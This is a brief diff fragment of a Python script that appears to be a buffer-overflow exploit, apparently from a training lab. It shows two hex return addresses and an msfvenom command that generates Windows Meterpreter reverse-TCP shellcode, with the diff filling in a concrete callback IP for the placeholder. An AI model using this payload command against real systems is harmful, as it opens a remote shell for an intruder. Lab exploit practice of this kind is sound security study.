@@ -164,7 +164,7 @@ import socket
 '''
 625011AF
 625011BB
-msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.X.X lport=4444 -b "\x00" -f python --> Payload
+msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.40.22 lport=4444 -b "\x00" -f python --> Payload
 '''
 
 
